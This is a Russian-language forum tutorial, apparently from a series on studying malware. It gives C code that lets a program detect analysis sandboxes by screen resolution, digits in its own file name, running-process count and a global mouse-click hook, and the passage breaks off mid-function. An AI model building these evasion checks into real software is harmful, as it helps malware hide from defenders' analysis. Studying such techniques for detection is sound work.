–í –ø–µ—Å–æ—á–Ω–æ–π —Å—Ä–µ–¥–µ —Ä–∞–∑—Ä–µ—à–µ–Ω–∏–µ –∏ —Å–≤–æ–π—Å—Ç–≤–∞ –æ—Ç–æ–±—Ä–∞–∂–µ–Ω–∏—è –º–∞—à–∏–Ω—ã —á–∞—Å—Ç–æ —É—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞—é—Ç—Å—è –Ω–∞ —Å—Ç–∞–Ω–¥–∞—Ä—Ç–∏–∑–∏—Ä–æ–≤–∞–Ω–Ω–æ–µ –∏ –ø–æ—Å—Ç–æ—è–Ω–Ω–æ–µ –∑–Ω–∞—á–µ–Ω–∏–µ, –∫–æ—Ç–æ—Ä–æ–µ –º–æ–∂–µ—Ç –æ—Ç–ª–∏—á–∞—Ç—å—Å—è –æ—Ç —Ä–∞–∑—Ä–µ—à–µ–Ω–∏—è –∏ —Å–≤–æ–π—Å—Ç–≤ –æ—Ç–æ–±—Ä–∞–∂–µ–Ω–∏—è —Ä–µ–∞–ª—å–Ω–æ–π –º–∞—à–∏–Ω—ã. –ü–æ—ç—Ç–æ–º—É –º–∞—à–∏–Ω—ã —Å –Ω–∏–∑–∫–∏–º —Ä–∞–∑—Ä–µ—à–µ–Ω–∏–µ–º –º–æ–≥—É—Ç —Å–ª—É–∂–∏—Ç—å –∏–Ω–¥–∏–∫–∞—Ç–æ—Ä–æ–º –≤–∏—Ä—Ç—É–∞–ª–∏–∑–∏—Ä–æ–≤–∞–Ω–Ω–æ–π —Å—Ä–µ–¥—ã.<br />
<br />
–° –ø—Ä–æ–≥—Ä–∞–º–º–Ω–æ–π —Ç–æ—á–∫–∏ –∑—Ä–µ–Ω–∏—è –ø–µ—Ä–≤—ã–º —à–∞–≥–æ–º –±—É–¥–µ—Ç –ø–µ—Ä–µ—á–∏—Å–ª–µ–Ω–∏–µ –º–æ–Ω–∏—Ç–æ—Ä–æ–≤ –æ—Ç–æ–±—Ä–∞–∂–µ–Ω–∏—è —Å–∏—Å—Ç–µ–º—ã —Å –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ–º —Ñ—É–Ω–∫—Ü–∏–∏ EnumDisplayMonitors WinAPI.<br />
<br />
–§—É–Ω–∫—Ü–∏—è EnumDisplayMonitors —Ç—Ä–µ–±—É–µ—Ç –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è —Ñ—É–Ω–∫—Ü–∏–∏ –æ–±—Ä–∞—Ç–Ω–æ–≥–æ –≤—ã–∑–æ–≤–∞ –¥–ª—è –∫–∞–∂–¥–æ–≥–æ –æ–±–Ω–∞—Ä—É–∂–µ–Ω–Ω–æ–≥–æ –º–æ–Ω–∏—Ç–æ—Ä–∞ –æ—Ç–æ–±—Ä–∞–∂–µ–Ω–∏—è, –≤ —ç—Ç–æ–π —Ñ—É–Ω–∫—Ü–∏–∏ –æ–±—Ä–∞—Ç–Ω–æ–≥–æ –≤—ã–∑–æ–≤–∞ –¥–æ–ª–∂–Ω–∞ –≤—ã–∑—ã–≤–∞—Ç—å—Å—è —Ñ—É–Ω–∫—Ü–∏—è GetMonitorInfoW WinAPI. –≠—Ç–∞ —Ñ—É–Ω–∫—Ü–∏—è –∏–∑–≤–ª–µ–∫–∞–µ—Ç —Ä–∞–∑—Ä–µ—à–µ–Ω–∏–µ –º–æ–Ω–∏—Ç–æ—Ä–∞ –æ—Ç–æ–±—Ä–∞–∂–µ–Ω–∏—è.<br />
<br />
–ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è, –ø–æ–ª—É—á–µ–Ω–Ω–∞—è –æ—Ç GetMonitorInfoW, –≤–æ–∑–≤—Ä–∞—â–∞–µ—Ç—Å—è –∫–∞–∫ —Å—Ç—Ä—É–∫—Ç—É—Ä–∞ MONITORINFO, –∫–æ—Ç–æ—Ä–∞—è –ø–æ–∫–∞–∑–∞–Ω–∞ –Ω–∏–∂–µ.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>typedef struct tagMONITORINFO {
  DWORD cbSize;       // –†–∞–∑–º–µ—Ä —Å—Ç—Ä—É–∫—Ç—É—Ä—ã
  RECT  rcMonitor;    // –ü—Ä—è–º–æ—É–≥–æ–ª—å–Ω–∏–∫ –º–æ–Ω–∏—Ç–æ—Ä–∞ –æ—Ç–æ–±—Ä–∞–∂–µ–Ω–∏—è, –≤—ã—Ä–∞–∂–µ–Ω–Ω—ã–π –≤ –∫–æ–æ—Ä–¥–∏–Ω–∞—Ç–∞—Ö –≤–∏—Ä—Ç—É–∞–ª—å–Ω–æ–≥–æ —ç–∫—Ä–∞–Ω–∞
  RECT  rcWork;       // –ü—Ä—è–º–æ—É–≥–æ–ª—å–Ω–∏–∫ —Ä–∞–±–æ—á–µ–π –æ–±–ª–∞—Å—Ç–∏ –º–æ–Ω–∏—Ç–æ—Ä–∞ –æ—Ç–æ–±—Ä–∞–∂–µ–Ω–∏—è, –≤—ã—Ä–∞–∂–µ–Ω–Ω—ã–π –≤ –∫–æ–æ—Ä–¥–∏–Ω–∞—Ç–∞—Ö –≤–∏—Ä—Ç—É–∞–ª—å–Ω–æ–≥–æ —ç–∫—Ä–∞–Ω–∞
  DWORD dwFlags;      // –ü—Ä–µ–¥—Å—Ç–∞–≤–ª—è–µ—Ç –∞—Ç—Ä–∏–±—É—Ç—ã –º–æ–Ω–∏—Ç–æ—Ä–∞ –æ—Ç–æ–±—Ä–∞–∂–µ–Ω–∏—è
} MONITORINFO, *LPMONITORINFO;</code></pre>
	</div>
</div><br />
–ß–ª–µ–Ω rcMonitor —Å–æ–¥–µ—Ä–∂–∏—Ç –Ω–µ–æ–±—Ö–æ–¥–∏–º—É—é –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é. –≠—Ç–æ—Ç —á–ª–µ–Ω —Ç–∞–∫–∂–µ —è–≤–ª—è–µ—Ç—Å—è —Å—Ç—Ä—É–∫—Ç—É—Ä–æ–π —Ç–∏–ø–∞ RECT, –∫–æ—Ç–æ—Ä–∞—è –æ–ø—Ä–µ–¥–µ–ª—è–µ—Ç –ø—Ä—è–º–æ—É–≥–æ–ª—å–Ω–∏–∫ —á–µ—Ä–µ–∑ –∫–æ–æ—Ä–¥–∏–Ω–∞—Ç—ã –µ–≥–æ –≤–µ—Ä—Ö–Ω–µ–≥–æ –ª–µ–≤–æ–≥–æ –∏ –Ω–∏–∂–Ω–µ–≥–æ –ø—Ä–∞–≤–æ–≥–æ —É–≥–ª–æ–≤.<br />
<br />
–ü–æ—Å–ª–µ –∏–∑–≤–ª–µ—á–µ–Ω–∏—è –∑–Ω–∞—á–µ–Ω–∏–π —Å—Ç—Ä—É–∫—Ç—É—Ä—ã RECT –≤—ã–ø–æ–ª–Ω—è—é—Ç—Å—è –≤—ã—á–∏—Å–ª–µ–Ω–∏—è –¥–ª—è –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–∏—è —Ñ–∞–∫—Ç–∏—á–µ—Å–∫–∏—Ö –∫–æ–æ—Ä–¥–∏–Ω–∞—Ç –æ—Ç–æ–±—Ä–∞–∂–µ–Ω–∏—è:<br />
<br />
MONITORINFO.rcMonitor.right - MONITORINFO.rcMonitor.left - –≠—Ç–æ –¥–∞–µ—Ç –Ω–∞–º —à–∏—Ä–∏–Ω—É (–∑–Ω–∞—á–µ–Ω–∏–µ X).<br />
MONITORINFO.rcMonitor.top - MONITORINFO.rcMonitor.bottom - –≠—Ç–æ –¥–∞–µ—Ç –Ω–∞–º –≤—ã—Å–æ—Ç—É (–∑–Ω–∞—á–µ–Ω–∏–µ Y).<br />
<br />
<b>–ê–Ω—Ç–∏–≤–∏—Ä—Ç—É–∞–ª–∏–∑–∞—Ü–∏—è —á–µ—Ä–µ–∑ —Ä–∞–∑—Ä–µ—à–µ–Ω–∏–µ –º–∞—à–∏–Ω—ã (–∫–æ–¥) </b><br />
<br />
–§—É–Ω–∫—Ü–∏—è CheckMachineResolution –∏—Å–ø–æ–ª—å–∑—É–µ—Ç –æ–ø–∏—Å–∞–Ω–Ω—ã–π –ø—Ä–æ—Ü–µ—Å—Å, –ø—Ä–∏ –∫–æ—Ç–æ—Ä–æ–º –≤—ã—á–∏—Å–ª—è–µ—Ç—Å—è —Ä–∞–∑—Ä–µ—à–µ–Ω–∏–µ –º–∞—à–∏–Ω—ã, –ø—É—Ç–µ–º –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è —Ñ—É–Ω–∫—Ü–∏–∏ –æ–±—Ä–∞—Ç–Ω–æ–≥–æ –≤—ã–∑–æ–≤–∞ ResolutionCallback.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>// –§—É–Ω–∫—Ü–∏—è –æ–±—Ä–∞—Ç–Ω–æ–≥–æ –≤—ã–∑–æ–≤–∞, –≤—ã–∑—ã–≤–∞–µ–º–∞—è –≤—Å—è–∫–∏–π —Ä–∞–∑, –∫–æ–≥–¥–∞ &#039;EnumDisplayMonitors&#039; –æ–±–Ω–∞—Ä—É–∂–∏–≤–∞–µ—Ç –º–æ–Ω–∏—Ç–æ—Ä
BOOL CALLBACK ResolutionCallback(HMONITOR hMonitor, HDC hdcMonitor, LPRECT lpRect, LPARAM ldata) {

    int X = 0,
        Y = 0;
    MONITORINFO MI = { .cbSize = sizeof(MONITORINFO) };

    if (!GetMonitorInfoW(hMonitor, &amp;MI)) {
        printf(&quot;\n\t[!] GetMonitorInfoW –∑–∞–≤–µ—Ä—à–∏–ª—Å—è —Å –æ—à–∏–±–∫–æ–π: %d \n&quot;, GetLastError());
        return FALSE;
    }

    // –í—ã—á–∏—Å–ª–µ–Ω–∏–µ –∫–æ–æ—Ä–¥–∏–Ω–∞—Ç X –æ—Ç–æ–±—Ä–∞–∂–µ–Ω–∏—è
    X = MI.rcMonitor.right - MI.rcMonitor.left;

    // –í—ã—á–∏—Å–ª–µ–Ω–∏–µ –∫–æ–æ—Ä–¥–∏–Ω–∞—Ç Y –æ—Ç–æ–±—Ä–∞–∂–µ–Ω–∏—è
    Y = MI.rcMonitor.top - MI.rcMonitor.bottom;

    // –ï—Å–ª–∏ —á–∏—Å–ª–∞ –æ—Ç—Ä–∏—Ü–∞—Ç–µ–ª—å–Ω—ã–µ, –º–µ–Ω—è–µ–º –∏—Ö
    if (X &lt; 0)
        X = -X;
    if (Y &lt; 0)
        Y = -Y;

    if ((X != 1920 &amp;&amp; X != 2560 &amp;&amp; X != 1440) || (Y != 1080 &amp;&amp; Y != 1200 &amp;&amp; Y != 1600 &amp;&amp; Y != 900))
        *((BOOL*)ldata) = TRUE; // –æ–±–Ω–∞—Ä—É–∂–µ–Ω–∞ –ø–µ—Å–æ—á–Ω–∏—Ü–∞

    return TRUE;
}

BOOL CheckMachineResolution() {

    BOOL SANDBOX = FALSE;

    // SANDBOX –±—É–¥–µ—Ç —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω –≤ TRUE &#039;EnumDisplayMonitors&#039;, –µ—Å–ª–∏ –æ–±–Ω–∞—Ä—É–∂–µ–Ω–∞ –ø–µ—Å–æ—á–Ω–∏—Ü–∞
    EnumDisplayMonitors(NULL, NULL, (MONITORENUMPROC)ResolutionCallback, (LPARAM)(&amp;SANDBOX));

    return SANDBOX;
}</code></pre>
	</div>
</div><br />
<b>–ê–Ω—Ç–∏–≤–∏—Ä—Ç—É–∞–ª–∏–∑–∞—Ü–∏—è —á–µ—Ä–µ–∑ –∏–º—è —Ñ–∞–π–ª–∞</b><br />
<br />
–ü–µ—Å–æ—á–Ω–∏—Ü—ã —á–∞—Å—Ç–æ –ø–µ—Ä–µ–∏–º–µ–Ω–æ–≤—ã–≤–∞—é—Ç —Ñ–∞–π–ª—ã –≤ –∫–∞—á–µ—Å—Ç–≤–µ –º–µ—Ç–æ–¥–∞ –∫–ª–∞—Å—Å–∏—Ñ–∏–∫–∞—Ü–∏–∏ (–Ω–∞–ø—Ä–∏–º–µ—Ä, –ø–µ—Ä–µ–∏–º–µ–Ω–æ–≤—ã–≤–∞—é—Ç —Ñ–∞–π–ª –≤ –µ–≥–æ —Ö—ç—à MD5). –≠—Ç–æ—Ç –ø—Ä–æ—Ü–µ—Å—Å –æ–±—ã—á–Ω–æ –ø—Ä–∏–≤–æ–¥–∏—Ç –∫ –ø—Ä–æ–∏–∑–≤–æ–ª—å–Ω–æ–º—É –∏–º–µ–Ω–∏ —Ñ–∞–π–ª–∞ —Å–º–µ—à–∞–Ω–Ω—ã–º–∏ –±—É–∫–≤–∞–º–∏ –∏ —Ü–∏—Ñ—Ä–∞–º–∏.<br />
<br />
–§—É–Ω–∫—Ü–∏—è ExeDigitsInNameCheck, –ø–æ–∫–∞–∑–∞–Ω–Ω–∞—è –Ω–∏–∂–µ, –∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è –¥–ª—è –ø–æ–¥—Å—á–µ—Ç–∞ –∫–æ–ª–∏—á–µ—Å—Ç–≤–∞ —Ü–∏—Ñ—Ä –≤ —Ç–µ–∫—É—â–µ–º –∏–º–µ–Ω–∏ —Ñ–∞–π–ª–∞. –û–Ω–∞ –∏—Å–ø–æ–ª—å–∑—É–µ—Ç —Ñ—É–Ω–∫—Ü–∏—é GetModuleFileNameA –¥–ª—è –ø–æ–ª—É—á–µ–Ω–∏—è –∏–º–µ–Ω–∏ —Ñ–∞–π–ª–∞ (–≤–∫–ª—é—á–∞—è –ø—É—Ç—å) –∏ –∑–∞—Ç–µ–º PathFindFileNameA –¥–ª—è —Ä–∞–∑–¥–µ–ª–µ–Ω–∏—è –∏–º–µ–Ω–∏ —Ñ–∞–π–ª–∞ –æ—Ç –ø—É—Ç–∏.<br />
<br />
–ó–∞—Ç–µ–º –∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è —Ñ—É–Ω–∫—Ü–∏—è isdigit –¥–ª—è –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–∏—è, —è–≤–ª—è—é—Ç—Å—è –ª–∏ —Å–∏–º–≤–æ–ª—ã –≤ –∏–º–µ–Ω–∏ —Ñ–∞–π–ª–∞ —Ü–∏—Ñ—Ä–∞–º–∏. –ï—Å–ª–∏ –≤ –∏–º–µ–Ω–∏ —Ñ–∞–π–ª–∞ —Å–æ–¥–µ—Ä–∂–∏—Ç—Å—è –±–æ–ª–µ–µ 3 —Ü–∏—Ñ—Ä, —Ç–æ ExeDigitsInNameCheck –ø—Ä–µ–¥–ø–æ–ª–∞–≥–∞–µ—Ç, —á—Ç–æ —ç—Ç–æ –ø–µ—Å–æ—á–Ω–∏—Ü–∞, –∏ –≤–æ–∑–≤—Ä–∞—â–∞–µ—Ç TRUE.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>BOOL ExeDigitsInNameCheck() {

    CHAR Path[MAX_PATH * 3];
    CHAR cName[MAX_PATH];
    DWORD dwNumberOfDigits = NULL;

    // –ü–æ–ª—É—á–µ–Ω–∏–µ —Ç–µ–∫—É—â–µ–≥–æ –∏–º–µ–Ω–∏ —Ñ–∞–π–ª–∞ (—Å –ø–æ–ª–Ω—ã–º –ø—É—Ç–µ–º)
    if (!GetModuleFileNameA(NULL, Path, MAX_PATH * 3)) {
        printf(&quot;\n\t[!] GetModuleFileNameA –∑–∞–≤–µ—Ä—à–∏–ª—Å—è —Å –æ—à–∏–±–∫–æ–π: %d \n&quot;, GetLastError());
        return FALSE;
    }

    // –ó–∞—â–∏—Ç–∞ –æ—Ç –ø–µ—Ä–µ–ø–æ–ª–Ω–µ–Ω–∏—è –±—É—Ñ–µ—Ä–∞ - –ø–æ–ª—É—á–µ–Ω–∏–µ –∏–º–µ–Ω–∏ —Ñ–∞–π–ª–∞ –∏–∑ –ø–æ–ª–Ω–æ–≥–æ –ø—É—Ç–∏
    if (lstrlenA(PathFindFileNameA(Path)) &lt; MAX_PATH)
        lstrcpyA(cName, PathFindFileNameA(Path));

    // –ü–æ–¥—Å—á–µ—Ç –∫–æ–ª–∏—á–µ—Å—Ç–≤–∞ —Ü–∏—Ñ—Ä
    for (int i = 0; i &lt; lstrlenA(cName); i++) {
        if (isdigit(cName[i]))
            dwNumberOfDigits++;
    }

    // –ú–∞–∫—Å–∏–º–∞–ª—å–Ω–æ–µ –¥–æ–ø—É—Å—Ç–∏–º–æ–µ –∫–æ–ª–∏—á–µ—Å—Ç–≤–æ —Ü–∏—Ñ—Ä: 3
    if (dwNumberOfDigits &gt; 3) {
        return TRUE;
    }

    return FALSE;
}</code></pre>
	</div>
</div><br />
<b>–ê–Ω—Ç–∏–≤–∏—Ä—Ç—É–∞–ª–∏–∑–∞—Ü–∏—è —á–µ—Ä–µ–∑ –∫–æ–ª–∏—á–µ—Å—Ç–≤–æ —Ä–∞–±–æ—Ç–∞—é—â–∏—Ö –ø—Ä–æ—Ü–µ—Å—Å–æ–≤</b><br />
<br />
–ï—â–µ –æ–¥–Ω–∏–º —Å–ø–æ—Å–æ–±–æ–º –æ–±–Ω–∞—Ä—É–∂–µ–Ω–∏—è –≤–∏—Ä—Ç—É–∞–ª–∏–∑–∏—Ä–æ–≤–∞–Ω–Ω–æ–π —Å—Ä–µ–¥—ã —è–≤–ª—è–µ—Ç—Å—è –ø—Ä–æ–≤–µ—Ä–∫–∞ –∫–æ–ª–∏—á–µ—Å—Ç–≤–∞ —Ä–∞–±–æ—Ç–∞—é—â–∏—Ö –ø—Ä–æ—Ü–µ—Å—Å–æ–≤ –≤ —Å–∏—Å—Ç–µ–º–µ. –ü–µ—Å–æ—á–Ω–∏—Ü—ã –æ–±—ã—á–Ω–æ –Ω–µ –∏–º–µ—é—Ç –º–Ω–æ–≥–æ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–π —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–Ω—ã—Ö –∏, —Å–ª–µ–¥–æ–≤–∞—Ç–µ–ª—å–Ω–æ, –∏–º–µ—é—Ç –º–µ–Ω—å—à–µ —Ä–∞–±–æ—Ç–∞—é—â–∏—Ö –ø—Ä–æ—Ü–µ—Å—Å–æ–≤. –ö–∞–∫ –∏ –≤ –ø—Ä–µ–¥—ã–¥—É—â–∏—Ö –º–µ—Ç–æ–¥–∞—Ö, —ç—Ç–æ –Ω–µ —è–≤–ª—è–µ—Ç—Å—è —É–Ω–∏–≤–µ—Ä—Å–∞–ª—å–Ω—ã–º –º–µ—Ç–æ–¥–æ–º, –∫–æ—Ç–æ—Ä—ã–π –≥–∞—Ä–∞–Ω—Ç–∏—Ä–æ–≤–∞–Ω–Ω–æ –æ–ø—Ä–µ–¥–µ–ª–∏—Ç —Å–∏—Å—Ç–µ–º—É –∫–∞–∫ –ø–µ—Å–æ—á–Ω–∏—Ü—É. –í —Å–∏—Å—Ç–µ–º–µ Windows –¥–æ–ª–∂–Ω–æ –±—ã—Ç—å –∫–∞–∫ –º–∏–Ω–∏–º—É–º 60-70 —Ä–∞–±–æ—Ç–∞—é—â–∏—Ö –ø—Ä–æ—Ü–µ—Å—Å–æ–≤.<br />
<br />
–ü—Ä–æ—Ü–µ—Å—Å—ã –±—É–¥—É—Ç –ø–µ—Ä–µ—á–∏—Å–ª—è—Ç—å—Å—è —Å –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ–º –º–µ—Ç–æ–¥–∏–∫–∏ EnumProcesses. –§—É–Ω–∫—Ü–∏—è CheckMachineProcesses –≤–æ–∑–≤—Ä–∞—â–∞–µ—Ç TRUE, –µ—Å–ª–∏ –æ–Ω–∞ –æ–±–Ω–∞—Ä—É–∂–∏–≤–∞–µ—Ç –ø–µ—Å–æ—á–Ω–∏—Ü—É, —Ç–æ –µ—Å—Ç—å –µ—Å–ª–∏ –≤ —Å–∏—Å—Ç–µ–º–µ –∑–∞–ø—É—â–µ–Ω–æ –º–µ–Ω–µ–µ 50 –ø—Ä–æ—Ü–µ—Å—Å–æ–≤.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>BOOL CheckMachineProcesses() {

    DWORD adwProcesses[1024];
    DWORD dwReturnLen = NULL,
        dwNmbrOfPids = NULL;

    if (!EnumProcesses(adwProcesses, sizeof(adwProcesses), &amp;dwReturnLen)) {
        printf(&quot;\n\t[!] EnumProcesses –∑–∞–≤–µ—Ä—à–∏–ª—Å—è —Å –æ—à–∏–±–∫–æ–π: %d \n&quot;, GetLastError());
        return FALSE;
    }

    dwNmbrOfPids = dwReturnLen / sizeof(DWORD);

    // –ï—Å–ª–∏ –º–µ–Ω–µ–µ 50 –ø—Ä–æ—Ü–µ—Å—Å–æ–≤, –≤–æ–∑–º–æ–∂–Ω–æ, —ç—Ç–æ –ø–µ—Å–æ—á–Ω–∏—Ü–∞
    if (dwNmbrOfPids &lt; 50)
        return TRUE;

    return FALSE;
}</code></pre>
	</div>
</div><br />
<b>–ê–Ω—Ç–∏–≤–∏—Ä—Ç—É–∞–ª–∏–∑–∞—Ü–∏—è —á–µ—Ä–µ–∑ –≤–∑–∞–∏–º–æ–¥–µ–π—Å—Ç–≤–∏–µ —Å –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–º</b><br />
<br />
–ü–µ—Å–æ—á–Ω–∏—Ü—ã —á–∞—Å—Ç–æ —Ä–∞–±–æ—Ç–∞—é—Ç –≤ –±–µ–∑–≥–æ–ª–æ–≤–æ–º –æ–∫—Ä—É–∂–µ–Ω–∏–∏, —Ç–æ –µ—Å—Ç—å –±–µ–∑ –¥–∏—Å–ø–ª–µ—è –∏–ª–∏ –ø–µ—Ä–∏—Ñ–µ—Ä–∏–π–Ω—ã—Ö —É—Å—Ç—Ä–æ–π—Å—Ç–≤, —Ç–∞–∫–∏—Ö –∫–∞–∫ –∫–ª–∞–≤–∏–∞—Ç—É—Ä–∞ –∏ –º—ã—à—å. –ë–µ–∑–≥–æ–ª–æ–≤—ã–µ –æ–∫—Ä—É–∂–µ–Ω–∏—è —Ç–∞–∫–∂–µ –æ–±—ã—á–Ω–æ –∞–≤—Ç–æ–º–∞—Ç–∏–∑–∏—Ä–æ–≤–∞–Ω—ã –∏ –∑–∞–ø—É—Å–∫–∞—é—Ç—Å—è —Å—Ü–µ–Ω–∞—Ä–∏—è–º–∏ –∏–ª–∏ –¥—Ä—É–≥–∏–º–∏ –∏–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç–∞–º–∏. –û—Ç—Å—É—Ç—Å—Ç–≤–∏–µ –≤–∑–∞–∏–º–æ–¥–µ–π—Å—Ç–≤–∏—è —Å –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–º –º–æ–∂–µ—Ç –±—ã—Ç—å –∏–Ω–¥–∏–∫–∞—Ç–æ—Ä–æ–º –≤–æ–∑–º–æ–∂–Ω–æ–≥–æ –ø–µ—Å–æ—á–Ω–∏—á–Ω–æ–≥–æ –æ–∫—Ä—É–∂–µ–Ω–∏—è. –ù–∞–ø—Ä–∏–º–µ—Ä, –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω–æ–µ –ø—Ä–æ–≥—Ä–∞–º–º–Ω–æ–µ –æ–±–µ—Å–ø–µ—á–µ–Ω–∏–µ –º–æ–∂–µ—Ç –ø—Ä–æ–≤–µ—Ä–∏—Ç—å, –Ω–µ –ø–æ—Å—Ç—É–ø–∏–ª–æ –ª–∏ –≤ –æ–∫—Ä—É–∂–µ–Ω–∏–µ –Ω–∏ –æ–¥–Ω–æ–≥–æ —â–µ–ª—á–∫–∞ –º—ã—à–∏ –∏–ª–∏ –Ω–∞–∂–∞—Ç–∏—è –∫–ª–∞–≤–∏—à–∏ –≤ —Ç–µ—á–µ–Ω–∏–µ –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–Ω–æ–≥–æ –ø–µ—Ä–∏–æ–¥–∞.<br />
<br />
–í—Å–ø–æ–º–Ω–∏—Ç–µ –ö—É–Ω–≥—Ñ—É-2.–ò–∑—É—á–∞–µ–º API Hooking | –¶–∏–∫–ª —Å—Ç–∞—Ç–µ–π &quot;–ò–∑—É—á–µ–Ω–∏–µ –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω—ã—Ö –ø—Ä–æ–≥—Ä–∞–º–º&quot;, –≥–¥–µ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–ª–∏—Å—å —Ñ—É–Ω–∫—Ü–∏–∏ SetWindowsHookExW –∏ CallNextHookEx WinAPI –¥–ª—è –æ—Ç—Å–ª–µ–∂–∏–≤–∞–Ω–∏—è —â–µ–ª—á–∫–æ–≤ –º—ã—à–∏. –¢–∞ –∂–µ —Å–∞–º–∞—è —Ç–µ—Ö–Ω–∏–∫–∞ –ø—Ä–∏–º–µ–Ω—è–µ—Ç—Å—è –≤ —Å–ª–µ–¥—É—é—â–µ–π —Ñ—É–Ω–∫—Ü–∏–∏, MouseClicksLogger. –ï—Å–ª–∏ –≤ —Ç–µ—á–µ–Ω–∏–µ 20 —Å–µ–∫—É–Ω–¥ –æ–Ω–∞ –Ω–µ –ø–æ–ª—É—á–∞–µ—Ç –±–æ–ª–µ–µ 5 —â–µ–ª—á–∫–æ–≤ –º—ã—à–∏, —Ç–æ –ø—Ä–µ–¥–ø–æ–ª–∞–≥–∞–µ—Ç—Å—è, —á—Ç–æ –Ω–∞—Ö–æ–¥–∏—Ç—Å—è –≤ –ø–µ—Å–æ—á–Ω–∏—á–Ω–æ–π —Å—Ä–µ–¥–µ.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>// –ú–æ–Ω–∏—Ç–æ—Ä–∏–Ω–≥ —â–µ–ª—á–∫–æ–≤ –º—ã—à–∏ –≤ —Ç–µ—á–µ–Ω–∏–µ 20 —Å–µ–∫—É–Ω–¥
#define MONITOR_TIME   20000 // –ì–ª–æ–±–∞–ª—å–Ω–∞—è –ø–µ—Ä–µ–º–µ–Ω–Ω–∞—è –¥–ª—è —Ö—Ä–∞–Ω–µ–Ω–∏—è –æ–±—Ä–∞–±–æ—Ç—á–∏–∫–∞ –≥–ª–æ–±–∞–ª—å–Ω–æ–≥–æ —Ö—É–∫–∞
HHOOK g_hMouseHook = NULL;
// –ì–ª–æ–±–∞–ª—å–Ω—ã–π —Å—á–µ—Ç—á–∏–∫ —â–µ–ª—á–∫–æ–≤ –º—ã—à–∏
DWORD g_dwMouseClicks = NULL;

// –§—É–Ω–∫—Ü–∏—è –æ–±—Ä–∞—Ç–Ω–æ–≥–æ –≤—ã–∑–æ–≤–∞, –∫–æ—Ç–æ—Ä–∞—è –±—É–¥–µ—Ç –≤—ã–ø–æ–ª–Ω–µ–Ω–∞ –ø—Ä–∏ —â–µ–ª—á–∫–µ –º—ã—à–∏ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–º
LRESULT CALLBACK HookEvent(int nCode, WPARAM wParam, LPARAM lParam) {

    // WM_RBUTTONDOWN :         &quot;–©–µ–ª—á–æ–∫ –ø—Ä–∞–≤–æ–π –∫–Ω–æ–ø–∫–æ–π –º—ã—à–∏&quot;
    // WM_LBUTTONDOWN :         &quot;–©–µ–ª—á–æ–∫ –ª–µ–≤–æ–π –∫–Ω–æ–ø–∫–æ–π –º—ã—à–∏&quot;
    // WM_MBUTTONDOWN :         &quot;–©–µ–ª—á–æ–∫ —Å—Ä–µ–¥–Ω–µ–π –∫–Ω–æ–ø–∫–æ–π –º—ã—à–∏&quot;

    if (wParam == WM_LBUTTONDOWN || wParam == WM_RBUTTONDOWN || wParam == WM_MBUTTONDOWN) {
        printf(&quot;[+] –ó–∞—Ä–µ–≥–∏—Å—Ç—Ä–∏—Ä–æ–≤–∞–Ω —â–µ–ª—á–æ–∫ –º—ã—à–∏ \n&quot;);
        g_dwMouseClicks++;
    }

    return CallNextHookEx(g_hMouseHook, nCode, wParam, lParam);
}

BOOL MouseClicksLogger() {

    MSG Msg = { 0 };

